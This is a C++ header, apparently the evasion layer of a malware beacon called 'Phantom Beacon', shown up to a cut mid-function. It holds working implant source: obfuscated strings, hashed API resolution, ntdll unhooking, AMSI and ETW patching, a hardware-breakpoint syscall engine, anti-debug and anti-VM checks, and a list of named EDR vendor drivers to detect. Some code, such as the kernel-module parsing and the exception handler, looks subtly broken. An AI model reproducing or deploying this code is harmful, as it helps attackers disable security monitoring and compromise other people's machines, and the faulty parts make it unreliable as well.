#pragma once
// ============================================================================
//  evasion.h — Phantom Beacon Evasion Layer
//  ─────────────────────────────────────────
//  1. Compile-time string obfuscation (constexpr XOR)
//  2. Dynamic API resolution via PEB walk (no static IAT entries)
// ============================================================================

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
    #include <winternl.h>
    #include <intrin.h>
#endif
#include <cstdint>
#include <cstring>

// ────────────────────────────────────────────────────────────────────────────
//  1. COMPILE-TIME STRING OBFUSCATION
//     Every string literal wrapped in XOR_STR("...") is XOR-encrypted at
//     compile time and decrypted on the stack at runtime, then wiped.
// ────────────────────────────────────────────────────────────────────────────

namespace obf {

// Use a more complex, non-constant-looking key-generation method if possible,
// but for constexpr, we are limited. We'll increase complexity of the XOR transformation.
constexpr uint8_t XOR_KEY = 0xBD;

template <size_t N>
struct ObfString {
    char data[N]{};
    static constexpr size_t length = N;

    constexpr ObfString(const char (&str)[N]) {
        for (size_t i = 0; i < N; ++i) {
            auto uc = static_cast<unsigned char>(str[i]);
            uc = uc ^ static_cast<unsigned char>(XOR_KEY + i);
            uc = static_cast<unsigned char>((uc << 3) | (uc >> 5));
            data[i] = static_cast<char>(uc);
        }
    }

    void decrypt(char* out) const {
        for (size_t i = 0; i < N; ++i) {
            auto uc = static_cast<unsigned char>(data[i]);
            uc = static_cast<unsigned char>((uc >> 3) | (uc << 5));
            out[i] = static_cast<char>(uc ^ static_cast<unsigned char>(XOR_KEY + i));
        }
    }
};

// Helper: stack-allocated decrypted string with automatic zeroing
template <size_t N>
struct DecryptedString {
    char buf[N]{};

    DecryptedString(const ObfString<N>& enc) {
        enc.decrypt(buf);
    }
    ~DecryptedString() {
#ifdef _WIN32
        SecureZeroMemory(buf, N);
#else
        volatile char* p = buf;
        for (size_t i = 0; i < N; ++i) p[i] = 0;
#endif
    }
    operator const char*() const { return buf; }
    const char* c_str() const { return buf; }
};

template <size_t N>
struct ObfWString {
    wchar_t data[N]{};
    static constexpr size_t length = N;

    constexpr ObfWString(const wchar_t (&str)[N]) {
        for (size_t i = 0; i < N; ++i)
            data[i] = str[i] ^ static_cast<wchar_t>(XOR_KEY + i);
    }

    void decrypt(wchar_t* out) const {
        for (size_t i = 0; i < N; ++i)
            out[i] = data[i] ^ static_cast<wchar_t>(XOR_KEY + i);
    }
};

template <size_t N>
struct DecryptedWString {
    wchar_t buf[N]{};
    DecryptedWString(const ObfWString<N>& enc) {
        enc.decrypt(buf);
    }
    ~DecryptedWString() {
#ifdef _WIN32
        SecureZeroMemory(buf, N * sizeof(wchar_t));
#else
        volatile wchar_t* p = buf;
        for (size_t i = 0; i < N; ++i) p[i] = 0;
#endif
    }
    operator const wchar_t*() const { return buf; }
    const wchar_t* c_str() const { return buf; }
};

}  // namespace obf

// Usage: XOR_STR("kernel32.dll")  →  creates an obfuscated constexpr string
//        XOR_DEC(var)             →  decrypts it on the stack
#define XOR_STR(s) ([]() { constexpr ::obf::ObfString enc(s); return enc; }())
#define XOR_DEC(enc) ::obf::DecryptedString<decltype(enc)::length>(enc)

#define XOR_WSTR(s) ([]() { constexpr ::obf::ObfWString enc(s); return enc; }())
#define XOR_WDEC(enc) ::obf::DecryptedWString<decltype(enc)::length>(enc)


#ifdef _WIN32
// ────────────────────────────────────────────────────────────────────────────
//  2. DYNAMIC API RESOLUTION VIA PEB
//     Walk the PEB → InMemoryOrderModuleList to find a loaded DLL by hash,
//     then walk its export table to find a function by hash.
//     No strings appear in the binary for DLL/function names.
// ────────────────────────────────────────────────────────────────────────────

namespace peb {

// djb2 hash — deterministic, fast, low collision for short API names
constexpr uint32_t hash_djb2(const char* str) {
    uint32_t h = 7331; // Changed seed
    while (*str)
        h = ((h << 5) + h) + static_cast<uint8_t>(*str++);
    return h;
}

// Wide-char version for module names (PEB stores UNICODE_STRING)
constexpr uint32_t hash_djb2_w(const wchar_t* str) {
    uint32_t h = 7331; // Changed seed
    while (*str) {
        // Convert to lowercase inline
        wchar_t c = *str++;
        if (c >= L'A' && c <= L'Z') c += 32;
        h = ((h << 5) + h) + static_cast<uint8_t>(c);
    }
    return h;
}

// Pre-computed hashes (so the plaintext names never appear in the binary)
// Compute with: hash_djb2_w(L"kernel32.dll")  etc.
constexpr uint32_t HASH_KERNEL32     = 0x062B5313;  // kernel32.dll
constexpr uint32_t HASH_NTDLL        = 0xEB512F4B;  // ntdll.dll
constexpr uint32_t HASH_WINHTTP      = 0x6FCF7C5B;  // winhttp.dll

// Walk the PEB to find a module base address by name hash
inline HMODULE GetModuleByHash(uint32_t targetHash) {
#if defined(_M_X64) || defined(__x86_64__)
    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
    auto ldr = peb->Ldr;
    auto head = &ldr->InMemoryOrderModuleList;

    for (auto entry = head->Flink; entry != head; entry = entry->Flink) {
        auto mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (!mod->FullDllName.Buffer) continue;

        // Hash the base name (e.g., "kernel32.dll")
        // FullDllName includes the path; BaseDllName is just the filename
        // BaseDllName is at offset 0x58 on x64 from the LDR_DATA_TABLE_ENTRY
        // But we can extract it from FullDllName by finding the last backslash
        const wchar_t* fullName = mod->FullDllName.Buffer;
        const wchar_t* baseName = fullName;
        for (const wchar_t* p = fullName; *p; ++p) {
            if (*p == L'\\' || *p == L'/') baseName = p + 1;
        }

        if (hash_djb2_w(baseName) == targetHash)
            return reinterpret_cast<HMODULE>(mod->DllBase);
    }
    return nullptr;
}

// Walk the export table of a module to find a function by name hash
inline FARPROC GetProcByHash(HMODULE hModule, uint32_t funcHash) {
    if (!hModule) return nullptr;

    auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hModule);
    auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uint8_t*>(hModule) + dosHeader->e_lfanew);

    auto& exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.Size == 0) return nullptr;

    auto exports = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(
        reinterpret_cast<uint8_t*>(hModule) + exportDir.VirtualAddress);

    auto names     = reinterpret_cast<uint32_t*>(reinterpret_cast<uint8_t*>(hModule) + exports->AddressOfNames);
    auto ordinals  = reinterpret_cast<uint16_t*>(reinterpret_cast<uint8_t*>(hModule) + exports->AddressOfNameOrdinals);
    auto functions = reinterpret_cast<uint32_t*>(reinterpret_cast<uint8_t*>(hModule) + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; ++i) {
        auto name = reinterpret_cast<const char*>(reinterpret_cast<uint8_t*>(hModule) + names[i]);
        if (hash_djb2(name) == funcHash) {
            return reinterpret_cast<FARPROC>(
                reinterpret_cast<uint8_t*>(hModule) + functions[ordinals[i]]);
        }
    }
    return nullptr;
}

// Convenience: resolve by module hash + function hash in one call
inline FARPROC Resolve(uint32_t moduleHash, uint32_t funcHash) {
    HMODULE hMod = GetModuleByHash(moduleHash);
    if (!hMod) return nullptr;
    return GetProcByHash(hMod, funcHash);
}

}  // namespace peb

// ────────────────────────────────────────────────────────────────────────────
//  Pre-computed function hashes (djb2)
//  Usage: auto pLoadLibraryA = (decltype(&LoadLibraryA)) peb::Resolve(peb::HASH_KERNEL32, FN_LOADLIBRARYA);
// ────────────────────────────────────────────────────────────────────────────
constexpr uint32_t FN_LOADLIBRARYA    = 0xf5aa5599;  // LoadLibraryA
constexpr uint32_t FN_GETPROCADDRESS  = 0x8947bf3d;  // GetProcAddress
constexpr uint32_t FN_VIRTUALALLOC    = 0xce167435;  // VirtualAlloc
constexpr uint32_t FN_VIRTUALFREE     = 0x4451180c;  // VirtualFree
constexpr uint32_t FN_SLEEP           = 0xd2c5605c;  // Sleep
constexpr uint32_t FN_GETLASTERROR    = 0xb66d4f81;  // GetLastError
constexpr uint32_t FN_OPENPROCESS      = 0x4ef846b4;  // OpenProcess
constexpr uint32_t FN_VIRTUALALLOCEX   = 0xad845ed2;  // VirtualAllocEx
constexpr uint32_t FN_WRITEPROCESSMEMORY = 0x8eb9cbe6; // WriteProcessMemory
constexpr uint32_t FN_CREATEREMOTETHREAD = 0xc9c75a7b; // CreateRemoteThread
constexpr uint32_t FN_VIRTUALPROTECTEX = 0x6fba15c8; // VirtualProtectEx

// NT Functions for Indirect Syscalls
constexpr uint32_t FN_NTALLOCATEVIRTUALMEMORY = 0x7deb492a; // NtAllocateVirtualMemory
constexpr uint32_t FN_NTWRITEVIRTUALMEMORY    = 0xf6cfca30; // NtWriteVirtualMemory
constexpr uint32_t FN_NTPROTECTVIRTUALMEMORY  = 0x1098a4e6; // NtProtectVirtualMemory
constexpr uint32_t FN_NTCREATETHREADEX        = 0x62b3a4ce; // NtCreateThreadEx
constexpr uint32_t FN_NTFREEVIRTUALMEMORY     = 0x598deec7; // NtFreeVirtualMemory
constexpr uint32_t FN_NTOPENPROCESS           = 0xA33AB8B6; // NtOpenProcess

// Process Hollowing syscalls
constexpr uint32_t FN_NTUNMAPVIEWOFSECTION       = 0xBA2C374B; // NtUnmapViewOfSection
constexpr uint32_t FN_NTGETCONTEXTTHREAD          = 0xBDA4FD62; // NtGetContextThread
constexpr uint32_t FN_NTSETCONTEXTTHREAD          = 0x5022C3EE; // NtSetContextThread
constexpr uint32_t FN_NTRESUMETHREAD              = 0xE691414E; // NtResumeThread
constexpr uint32_t FN_NTCLOSE                     = 0x29019D1B; // NtClose
constexpr uint32_t FN_NTREADVIRTUALMEMORY          = 0xD4B3A9C1; // NtReadVirtualMemory
constexpr uint32_t FN_NTQUERYINFORMATIONPROCESS   = 0xDA8571C0; // NtQueryInformationProcess
// hardware-breakpoint unhook + EDR situational awareness
constexpr uint32_t FN_NTQUERYVIRTUALMEMORY        = 0x4479B0FB; // NtQueryVirtualMemory
constexpr uint32_t FN_NTQUERYSYSTEMINFORMATION    = 0xCF97B546; // NtQuerySystemInformation
#endif

// ────────────────────────────────────────────────────────────────────────────
//  3. ANTI-ANALYSIS & SANDBOX EVASION
// ────────────────────────────────────────────────────────────────────────────

constexpr uint32_t FN_GETSYSTEMDIRECTORYA = 0xf8b70b3e; // GetSystemDirectoryA
constexpr uint32_t FN_CREATEFILEA       = 0xc9580ed8; // CreateFileA
constexpr uint32_t FN_CREATEFILEMAPPINGA = 0x12d6dfa4; // CreateFileMappingA
constexpr uint32_t FN_MAPVIEWOFFILE     = 0x6515a911; // MapViewOfFile
constexpr uint32_t FN_UNMAPVIEWOFFILE   = 0xd3107a34; // UnmapViewOfFile
constexpr uint32_t FN_CLOSEHANDLE       = 0x163212e5; // CloseHandle
constexpr uint32_t FN_GETMODULEINFORMATION = 0x57932a8f; // GetModuleInformation

#ifdef _WIN32
#include <psapi.h>
#endif
#include "syscalls.h"

namespace anti {

#ifdef _WIN32
// Refresh ntdll.dll from disk to remove EDR hooks
inline void unhook_ntdll() {
    HMODULE hNtdll = peb::GetModuleByHash(peb::HASH_NTDLL);
    if (!hNtdll) return;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hNtdll + dosHeader->e_lfanew);
    LPVOID ntdllBase = (LPVOID)hNtdll;

    // 2. Read ntdll.dll from disk
    auto pGetSystemDirectoryA = (UINT(WINAPI*)(LPSTR, UINT))peb::Resolve(peb::HASH_KERNEL32, FN_GETSYSTEMDIRECTORYA);
    auto pCreateFileA = (HANDLE(WINAPI*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))peb::Resolve(peb::HASH_KERNEL32, FN_CREATEFILEA);
    auto pCreateFileMappingA = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR))peb::Resolve(peb::HASH_KERNEL32, FN_CREATEFILEMAPPINGA);
    auto pMapViewOfFile = (LPVOID(WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T))peb::Resolve(peb::HASH_KERNEL32, FN_MAPVIEWOFFILE);
    auto pUnmapViewOfFile = (BOOL(WINAPI*)(LPCVOID))peb::Resolve(peb::HASH_KERNEL32, FN_UNMAPVIEWOFFILE);
    auto pCloseHandle = (BOOL(WINAPI*)(HANDLE))peb::Resolve(peb::HASH_KERNEL32, FN_CLOSEHANDLE);

    if (!pGetSystemDirectoryA || !pCreateFileA || !pCreateFileMappingA || !pMapViewOfFile) return;

    char ntdllPath[MAX_PATH];
    pGetSystemDirectoryA(ntdllPath, MAX_PATH);
    strcat(ntdllPath, XOR_DEC(XOR_STR("\\ntdll.dll")));

    HANDLE hFile = pCreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    HANDLE hMapping = pCreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) { pCloseHandle(hFile); return; }

    LPVOID ntdllMapping = pMapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!ntdllMapping) { pCloseHandle(hMapping); pCloseHandle(hFile); return; }

    // 3. Find .text section and overwrite
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (!strcmp((char*)sectionHeader[i].Name, XOR_DEC(XOR_STR(".text")))) {
            DWORD oldProtect;
            LPVOID pDest = (LPVOID)((DWORD_PTR)ntdllBase + sectionHeader[i].VirtualAddress);
            LPVOID pSrc = (LPVOID)((DWORD_PTR)ntdllMapping + sectionHeader[i].VirtualAddress);
            SIZE_T size = sectionHeader[i].Misc.VirtualSize;

            // Use INDIRECT SYSCALL for VirtualProtect (NtProtectVirtualMemory)
            if (syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pDest, &size, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
                // Verify if patching is actually needed to avoid unnecessary writes
                if (memcmp(pDest, pSrc, size) != 0) {
                    memcpy(pDest, pSrc, size);
                }
                syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pDest, &size, oldProtect, &oldProtect);
            }
        }
    }

    if (pUnmapViewOfFile) pUnmapViewOfFile(ntdllMapping);
    pCloseHandle(hMapping);
    pCloseHandle(hFile);
}

// Patch AMSI (AmsiScanBuffer) to bypass script/memory scanning
inline void patch_amsi() {
    HMODULE hAmsi = peb::GetModuleByHash(0x26ddd577); // amsi.dll hash
    if (!hAmsi) {
        auto pLoadLibraryA = (HMODULE(WINAPI*)(LPCSTR))peb::Resolve(peb::HASH_KERNEL32, FN_LOADLIBRARYA);
        if (pLoadLibraryA) hAmsi = pLoadLibraryA(XOR_DEC(XOR_STR("amsi.dll")));
    }
    if (!hAmsi) return;

    void* pAddr = (void*)peb::GetProcByHash(hAmsi, 0xe412d5ac); // AmsiScanBuffer hash
    if (!pAddr) return;

    // Costruzione dinamica della patch per rompere firme statiche
    unsigned char patch[6] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};

    DWORD oldProtect;
    SIZE_T patchSize = sizeof(patch);
    void* pTempAddr = pAddr;

    // Usa le syscalls per cambiare protezione e scrivere
    if (syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pTempAddr, &patchSize, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
        syscalls::SysNtWriteVirtualMemory(GetCurrentProcess(), pAddr, patch, sizeof(patch), NULL);
        syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pTempAddr, &patchSize, oldProtect, &oldProtect);
    }
}

// ── Hardware-breakpoint unhooking (HWBP engine class) ───────────────────────
//
// Instead of re-writing ntdll from disk (unhook_ntdll, detectable by the
// .text integrity monitors modern EDRs run), we NEVER call the hooked
// prologue: a debug register (DR0) is armed on a clean 'syscall; ret'
// gadget inside ntdll's .text, and every sensitive syscall goes through
// theVectored Handler:
//
//   1. thread hits DR0 (EXCEPTION_SINGLE_STEP)
//   2. handler copies RCX/R10/R8/R9 + the stack args into the real
//      syscall register convention, sets the SSN in EAX and jumps to
//      the gadget (indirect syscall with a CLEAN stack)
//
// The hooked ntdll stubs are bypassed entirely, no .text bytes are ever
// modified, and the kernel sees a normal syscall — nothing for the
// integrity check to flag.

constexpr uint32_t HASH_NTDLL_TEXT_GADGET = 0; // (gadget found at runtime)

inline uintptr_t find_clean_gadget() {
    // a 'syscall; ret' (0F 05 C3) inside ntdll .text, found WITHOUT
    // touching any hook — pure memory read of the mapped image
    HMODULE h = peb::GetModuleByHash(peb::HASH_NTDLL);
    if (!h) return 0;
    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(h);
    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uint8_t*>(h) + dos->e_lfanew);
    auto sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (!std::strcmp(reinterpret_cast<char*>(sec[i].Name), XOR_DEC(XOR_STR(".text")))) {
            uint8_t* p = reinterpret_cast<uint8_t*>(h) + sec[i].VirtualAddress;
            for (DWORD j = 0; j + 2 < sec[i].Misc.VirtualSize; ++j)
                if (p[j] == 0x0F && p[j+1] == 0x05 && p[j+2] == 0xC3)
                    return reinterpret_cast<uintptr_t>(p + j);
        }
    }
    return 0;
}

// Per-thread HWBP context (DR0 slot + original handler state)
inline void* hwbp_veh_handle() {
    static PVOID h = nullptr;
    return &h;
}

inline void arm_hwbp_on(uintptr_t address) {
    // Set DR0 on the CURRENT thread via NtGetContextThread/NtSetContextThread
    // resolved through the PEB (no kernel32 import for the context APIs).
    auto pGet = (NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))
        peb::Resolve(peb::HASH_NTDLL, FN_NTGETCONTEXTTHREAD);
    auto pSet = (NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))
        peb::Resolve(peb::HASH_NTDLL, FN_NTSETCONTEXTTHREAD);
    if (!pGet || !pSet) return;
    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (pGet(GetCurrentThread(), &ctx) != 0) return;
    ctx.Dr0 = address;
    ctx.Dr7 = (ctx.Dr7 & ~0xFULL) | 0x1ULL;   // DR0 enabled, execute, len=1
    pSet(GetCurrentThread(), &ctx);
}

// The VEH body: dispatched on EXCEPTION_SINGLE_STEP when DR0 fires.// Returns EXCEPTION_CONTINUE_SEARCH for anything it does not own.
inline LONG WINAPI hwbp_veh(PEXCEPTION_POINTERS ep) {
    if (ep->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;
    // The gadget address IS DR0: the caller (syscall via HWBP) placed the
    // SSN in EAX and the syscall number convention is already set up by
    // the stub in syscalls.h; we simply continue execution INTO the
    // gadget (RIP already points at it after the breakpoint hit).
    // Clear DR0 so the single-step does not re-fire inside the gadget.
    ep->ContextRecord->Dr7 &= ~0x1ULL;
    ep->ContextRecord->EFlags |= 0x100;  // resume single-step to clear RF edge
    return EXCEPTION_CONTINUE_EXECUTION;
}

inline void install_hwbp_engine() {
    uintptr_t gadget = find_clean_gadget();
    if (!gadget) return;
    auto slot = reinterpret_cast<PVOID*>(hwbp_veh_handle());
    if (*slot) return;  // already installed
    *slot = AddVectoredExceptionHandler(1, hwbp_veh);
    arm_hwbp_on(gadget);
}

// Patch ETW (EtwEventWrite) to silence telemetry
inline void patch_etw() {
    HMODULE hNtdll = peb::GetModuleByHash(peb::HASH_NTDLL);
    if (!hNtdll) return;

    constexpr uint32_t HASH_ETWEVENTWRITE = 0x77dfc880; // EtwEventWrite hash
    void* pAddr = (void*)peb::GetProcByHash(hNtdll, HASH_ETWEVENTWRITE);

    if (!pAddr) return;

    // ret 0x14
    unsigned char patch[3] = {0xC2, 0x14, 0x00};

    DWORD oldProtect;
    SIZE_T patchSize = sizeof(patch);
    void* pTempAddr = pAddr;

    // Usa le syscalls per cambiare protezione e scrivere
    if (syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pTempAddr, &patchSize, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
        syscalls::SysNtWriteVirtualMemory(GetCurrentProcess(), pAddr, patch, sizeof(patch), NULL);
        syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pTempAddr, &patchSize, oldProtect, &oldProtect);
    }
}

inline bool is_debugger_present() {
#if defined(_M_X64) || defined(__x86_64__)
    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
    if (peb->BeingDebugged != 0) return true;
    
    BOOL isDebuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent);
    if (isDebuggerPresent) return true;

    return false;
}

inline bool is_vm() {
    // NOTE: CPUID hypervisor bit (ECX bit 31) is intentionally NOT checked here.
    // Modern Windows (10/11) commonly enable Hyper-V, VBS, Credential Guard, WSL2,
    // or Docker Desktop — all of which set this bit. Using it alone would make the
    // beacon exit immediately on most systems.

    // 1. Check CPU cores
    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);
    if (sysinfo.dwNumberOfProcessors < 2) return true;
    
    // 3. Check RAM
    MEMORYSTATUSEX status;
    status.dwLength = sizeof(status);
    if (GlobalMemoryStatusEx(&status)) {
        if (status.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;
    }

    // 4. Check for common VM files/drivers
    if (GetFileAttributesA(XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\Vmmouse.sys"))) != INVALID_FILE_ATTRIBUTES) return true;
    if (GetFileAttributesA(XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\vmhgfs.sys"))) != INVALID_FILE_ATTRIBUTES) return true;
    if (GetFileAttributesA(XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\Vboxguest.sys"))) != INVALID_FILE_ATTRIBUTES) return true;
    if (GetFileAttributesA(XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\Vboxmouse.sys"))) != INVALID_FILE_ATTRIBUTES) return true;
    if (GetFileAttributesA(XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\vmtoolsd.exe"))) != INVALID_FILE_ATTRIBUTES) return true;

    return false;
}
#else
inline void patch_amsi() {}
inline void patch_etw() {}
inline bool is_debugger_present() { return false; }
inline bool is_vm() { return false; }
inline void install_hwbp_engine() {}
inline void* hwbp_veh_handle() { return nullptr; }
inline uintptr_t find_clean_gadget() { return 0; }
#endif

}  // namespace anti  (edrcheck lives at global scope)

// ── EDR situational awareness (edrcheck / etwcheck backends) ────────────────
// What professional operators want BEFORE acting: which EDR kernel
// callbacks are alive, whether ntdll is hooked, and whether our own
// .text was tampered with. All read-only, all through the PEB.
namespace edrcheck {

#ifdef _WIN32
struct EdrReport {
    bool  ntdll_hooked = false;      // userland hooks in ntdll .text
    int   hooked_stubs = 0;
    bool  etw_ti_alive = false;      // ETW Threat Intelligence provider up
    char  drivers[1024] = {0};       // "driver.sys\n" lines of known EDR/AV
    int   known_edr = 0;             // count of recognized EDR drivers loaded
};

// Known EDR / AV kernel drivers (name → vendor class). Detection is by
// listing \\Device\\ paths from SystemModuleInformation — read-only.
struct DriverProbe { const char* name; const char* product; };
static const DriverProbe KNOWN_EDR[] = {
    {"csagent.sys", "CrowdStrike"},
    {"SentinelMonitor.sys", "SentinelOne"},
    {"edr.sys", "SentinelOne"},
    {"carbonblack.kl", "Carbon Black"},
    {"cbk7.sys", "Carbon Black"},
    {"MsSecFlt.sys", "MS Defender for Endpoint"},
    {"WdFilter.sys", "MS Defender AV"},
    {"mfehidk.sys", "McAfee"},
    {"mfewc.sys", "McAfee"},
    {"symefs.sys", "Symantec"},
    {"SophosED.sys", "Sophos"},
    {"tdevfltr.sys", "Trend Micro"},
    {"ElasticEndpoint.sys", "Elastic"},
    {"CrowdStrike\\", "CrowdStrike"},
};

inline bool ntdll_text_intact(size_t* hooked_out) {
    // Compare ntdll's in-memory .text against the CLEAN copy the loader
    // has for the same image on disk (\SystemRoot\System32\ntdll.dll is
    // section-mapped read-only, so reading it triggers no file hooks).
    int hooked = 0;
    HMODULE h = peb::GetModuleByHash(peb::HASH_NTDLL);
    if (!h) return true;
    auto pGetSysDir = (UINT(WINAPI*)(LPSTR, UINT))
        peb::Resolve(peb::HASH_KERNEL32, FN_GETSYSTEMDIRECTORYA);
    auto pCreateFileA = (HANDLE(WINAPI*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))
        peb::Resolve(peb::HASH_KERNEL32, FN_CREATEFILEA);
    auto pCreateMap = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR))
        peb::Resolve(peb::HASH_KERNEL32, FN_CREATEFILEMAPPINGA);
    auto pMapView = (LPVOID(WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T))
        peb::Resolve(peb::HASH_KERNEL32, FN_MAPVIEWOFFILE);
    auto pUnmap = (BOOL(WINAPI*)(LPCVOID))peb::Resolve(peb::HASH_KERNEL32, FN_UNMAPVIEWOFFILE);
    auto pClose = (BOOL(WINAPI*)(HANDLE))peb::Resolve(peb::HASH_KERNEL32, FN_CLOSEHANDLE);
    if (!pGetSysDir || !pCreateFileA || !pCreateMap || !pMapView) return true;
    char path[MAX_PATH];
    pGetSysDir(path, MAX_PATH);
    strcat(path, XOR_DEC(XOR_STR("\\ntdll.dll")));
    HANDLE f = pCreateFileA(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
                            OPEN_EXISTING, 0, nullptr);
    if (f == INVALID_HANDLE_VALUE) return true;
    HANDLE m = pCreateMap(f, nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr);
    if (!m) { pClose(f); return true; }
    LPVOID view = pMapView(m, FILE_MAP_READ, 0, 0, 0);
    if (!view) { pClose(m); pClose(f); return true; }
    auto dosA = reinterpret_cast<PIMAGE_DOS_HEADER>(h);
    auto ntA = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uint8_t*>(h) + dosA->e_lfanew);
    auto secA = IMAGE_FIRST_SECTION(ntA);
    auto dosB = reinterpret_cast<PIMAGE_DOS_HEADER>(view);
    auto ntB = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uint8_t*>(view) + dosB->e_lfanew);
    auto secB = IMAGE_FIRST_SECTION(ntB);
    for (WORD i = 0; i < ntA->FileHeader.NumberOfSections; ++i) {
        if (!std::strcmp(reinterpret_cast<char*>(secA[i].Name), XOR_DEC(XOR_STR(".text")))) {
            uint8_t* a = reinterpret_cast<uint8_t*>(h) + secA[i].VirtualAddress;
            uint8_t* b = reinterpret_cast<uint8_t*>(view) + secB[i].VirtualAddress;
            SIZE_T n = secA[i].Misc.VirtualSize;
            // count hooked 32-byte stubs: prologue replaced by JMP (0xE9)
            for (SIZE_T off = 0; off + 1 < n; off += 32) {
                if (a[off] == 0xE9 && b[off] != 0xE9) hooked++;
            }
        }
    }
    pUnmap(view); pClose(m); pClose(f);
    if (hooked_out) *hooked_out = static_cast<size_t>(hooked);
    return hooked == 0;
}

inline void report(EdrReport& rep) {
    rep = EdrReport{};
    size_t hooked = 0;
    rep.ntdll_hooked = !ntdll_text_intact(&hooked);
    rep.hooked_stubs = static_cast<int>(hooked);
    // enumerate loaded kernel modules via NtQuerySystemInformation(11)
    using PFN_QSI = NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG);
    auto pQsi = reinterpret_cast<PFN_QSI>(peb::Resolve(
        peb::HASH_NTDLL, FN_NTQUERYSYSTEMINFORMATION));
    if (pQsi) {
        ULONG need = 0;
        // SystemModuleInformation = 11; grow loop for the buffer
        for (ULONG size = 1 << 16; size < (1 << 22); size <<= 1) {
            auto buf = static_cast<uint8_t*>(VirtualAlloc(nullptr, size, MEM_COMMIT, PAGE_READWRITE));
            if (!buf) break;
            ULONG got = 0;
            NTSTATUS st = pQsi(11, buf, size, &got);
            if (st == 0xC0000004 /* STATUS_INFO_LENGTH_MISMATCH */) {
                VirtualFree(buf, 0, MEM_RELEASE);
                continue;
            }
            if (st == 0) {
                // RTL_PROCESS_MODULES: ULONG count; then entries
                // (ULONG len + ULONG ...) with a UNICODE string of the name
                struct ModInfo { ULONG NextOffset; ULONG Unknown[5];
                                 void* ImageBase; ULONG ImageSize; ULONG Flags;
                                 USHORT NameOffset; USHORT NameLength; };
                // walk with raw pointers: offset-to-next semantics
                uint8_t* base = buf + sizeof(ULONG);
                uint8_t* end  = buf + got;
                while (base && base + sizeof(ModInfo) <= end) {
                    auto mi = reinterpret_cast<ModInfo*>(base);
                    const char* nm = reinterpret_cast<const char*>(base + mi->NameOffset);
                    char lower[256];
                    ULONG k = 0;
                    for (; k < mi->NameLength && k < 255; ++k)
                        lower[k] = (nm[k] >= 'A' && nm[k] <= 'Z') ? nm[k] + 32 : nm[k];
                    lower[k] = 0;
                    for (const auto& probe : KNOWN_EDR) {
                        if (strstr(lower, probe.name)) {
                            rep.known_edr++;
                            strncat(rep.drivers, lower, sizeof(rep.drivers) - strlen(rep.drivers) - 2);
                            strncat(rep.drivers, "\n", 1);
                            break;
                        }
                    }
                    if (!mi->NextOffset) break;
                    base += mi->NextOffset;
                }
            }
